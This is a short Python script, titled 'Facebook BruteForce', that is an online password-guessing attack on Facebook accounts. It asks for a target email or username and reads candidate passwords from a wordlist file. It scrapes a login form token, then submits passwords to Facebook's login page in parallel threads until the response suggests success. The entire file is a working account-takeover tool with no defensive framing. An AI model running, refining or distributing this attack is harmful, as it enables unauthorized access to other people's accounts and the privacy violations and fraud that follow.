import os.path
import requests
import concurrent.futures
from bs4 import BeautifulSoup
import sys

if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
    fb.py\n\t--------------------------------------''')
    sys.exit()

PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}


def create_form(session):
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = session.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies


def is_this_a_password(session, email, index, password):
    if index % 10 == 0:
        payload, cookies = create_form(session)
        payload['email'] = email
    else:
        payload = {}
        cookies = {}

    payload['pass'] = password
    r = session.post(POST_URL, data=payload, cookies=cookies, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('Password found: ', password)
        return True
    return False


def process_password(email, index, password):
    password = password.strip()
    if len(password) < MIN_PASSWORD_LENGTH:
        return False
    print("Trying password [", index, "]: ", password)
    with requests.Session() as session:
        return is_this_a_password(session, email, index, password)


if __name__ == "__main__":
    print('\n------------ Facebook BruteForce ----------\n')
    if not os.path.isfile(PASSWORD_FILE):
        print("Password file does not exist: ", PASSWORD_FILE)
        sys.exit(0)

    password_data = []
    with open(PASSWORD_FILE, 'r') as file:
        password_data = [line.strip() for line in file]

    print("Password file selected: ", PASSWORD_FILE)
    email = input('Enter Email/Username to target: ').strip()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        results = [executor.submit(process_password, email, index, password) for index, password in enumerate(password_data)]
        for future in concurrent.futures.as_completed(results):
            if future.result():
                break
